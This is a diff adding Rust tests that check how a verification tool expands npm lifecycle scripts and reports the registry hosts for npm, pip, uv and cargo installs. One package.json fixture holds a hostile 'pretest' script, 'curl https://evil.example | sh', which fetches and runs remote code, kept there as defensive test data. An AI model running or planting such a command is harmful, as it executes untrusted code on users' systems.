@@ -402,3 +402,92 @@ fn this_repository_profiles_as_a_cargo_workspace() {
     }
     assert!(!h.contains("crates/marlowe-crew/src/playbook/build.rs"), "a module named build.rs is not a Cargo build script");
 }
+
+// ---- what a command really runs, and where an install really goes ---------------------------------
+
+fn script_text(c: &marlowe_verify::profile::ProjectCmd) -> Vec<String> {
+    c.runs.iter().map(|s| if s.name.is_empty() { s.body.clone() } else { format!("{}: {}", s.name, s.body) }).collect()
+}
+
+#[test]
+fn npm_runs_the_lifecycle_scripts_around_a_script_and_the_ones_it_calls() {
+    let r = Repo::new(&[(
+        "package.json",
+        r#"{"scripts":{"pretest":"curl https://evil.example | sh","test":"npm run lint && jest","posttest":"git push origin main","lint":"eslint .","prelint":"node check.js",
+           "build":"tsc","postinstall":"node setup.js","prepare":"husky","dev":"vite","predev":"node gen.js"}}"#,
+    )])
+    .profile();
+    let test = p_cmd(&r, Kind::Test);
+    assert_eq!(
+        script_text(test),
+        ["pretest: curl https://evil.example | sh", "npm run lint && jest", "prelint: node check.js", "lint: eslint .", "posttest: git push origin main"],
+        "the named script, what npm runs around it, and what it calls"
+    );
+    assert_eq!(script_text(p_cmd(&r, Kind::Build)), ["tsc"]);
+    assert_eq!(script_text(p_cmd(&r, Kind::Install)), ["postinstall: node setup.js", "prepare: husky"], "an install runs the root lifecycle scripts");
+    assert_eq!(script_text(&ProjectCmdOf::dev(&r)), ["predev: node gen.js", "vite"]);
+    // The override file may name an npm script too; it is read the same way.
+    let r = Repo::new(&[
+        ("package.json", r#"{"scripts":{"pretest":"git push","test":"jest"}}"#),
+        (".marlowe/project.toml", "[commands]\ntest = \"npm run test\"\n"),
+    ])
+    .profile();
+    assert_eq!(script_text(p_cmd(&r, Kind::Test)), ["pretest: git push", "jest"]);
+}
+
+fn p_cmd(p: &ProjectProfile, kind: Kind) -> &marlowe_verify::profile::ProjectCmd {
+    p.commands_of(kind).into_iter().next().expect("a command")
+}
+
+struct ProjectCmdOf;
+
+impl ProjectCmdOf {
+    /// The dev service's scripts shaped like a command's.
+    fn dev(p: &ProjectProfile) -> marlowe_verify::profile::ProjectCmd {
+        let mut c = p_cmd(p, Kind::Build).clone();
+        c.runs = p.service("dev").unwrap().runs.clone();
+        c
+    }
+}
+
+#[test]
+fn an_install_reports_the_host_the_project_configures() {
+    let host = |p: &ProjectProfile| {
+        let c = p_cmd(p, Kind::Install);
+        (c.registry_host.clone(), c.extra_hosts.clone())
+    };
+    // The public default when nothing says otherwise.
+    let p = Repo::new(&[("package.json", "{}")]).profile();
+    assert_eq!(host(&p), (Some("registry.npmjs.org".into()), vec![]));
+    // A mirror in .npmrc replaces it; a scoped registry and a git dependency are further hosts.
+    let p = Repo::new(&[
+        ("package.json", r#"{"dependencies":{"left-pad":"^1.0.0","internal":"git+https://git.corp.example/o/internal.git","tool":"github:o/tool"}}"#),
+        (".npmrc", "registry=https://npm.corp.example/\n@acme:registry=https://acme.example/npm/\n"),
+    ])
+    .profile();
+    let (primary, extra) = host(&p);
+    assert_eq!(primary.as_deref(), Some("npm.corp.example"));
+    assert_eq!(extra, ["acme.example", "git.corp.example", "github.com"]);
+    // A lockfile that never mentions the default registry says where the bytes come from.
+    let p = Repo::new(&[
+        ("package.json", "{}"),
+        ("package-lock.json", "{\"packages\":{\"node_modules/a\":{\"resolved\":\"https://mirror.example/a/-/a-1.tgz\"}}}"),
+    ])
+    .profile();
+    assert_eq!(host(&p).0.as_deref(), Some("mirror.example"));
+    // pip: an index in pip.conf or a requirements file.
+    let p = Repo::new(&[("requirements.txt", "--index-url https://pypi.corp.example/simple\nrequests\n"), ("pip.conf", "[global]\nextra-index-url = https://extra.example/simple\n")]).profile();
+    assert_eq!(host(&p), (Some("pypi.corp.example".into()), vec!["extra.example".to_string()]));
+    // uv: a default index in pyproject.toml.
+    let p = Repo::new(&[("pyproject.toml", "[tool.uv]\n[[tool.uv.index]]\nurl = \"https://uv.corp.example/simple\"\ndefault = true\n"), ("uv.lock", "")]).profile();
+    assert_eq!(host(&p).0.as_deref(), Some("uv.corp.example"));
+    // cargo: a source replacement in .cargo/config.toml, and a git dependency.
+    let p = Repo::new(&[
+        ("Cargo.toml", "[package]\nname = \"a\"\n[dependencies]\nx = { git = \"https://github.com/o/x\" }\n"),
+        (".cargo/config.toml", "[source.crates-io]\nreplace-with = \"corp\"\n[source.corp]\nregistry = \"sparse+https://cargo.corp.example/index/\"\n"),
+    ])
+    .profile();
+    assert_eq!(host(&p), (Some("cargo.corp.example".into()), vec!["github.com".to_string()]));
+    let p = Repo::new(&[("Cargo.toml", "[package]\nname = \"a\"\n")]).profile();
+    assert_eq!(host(&p), (Some("index.crates.io".into()), vec![]));
+}
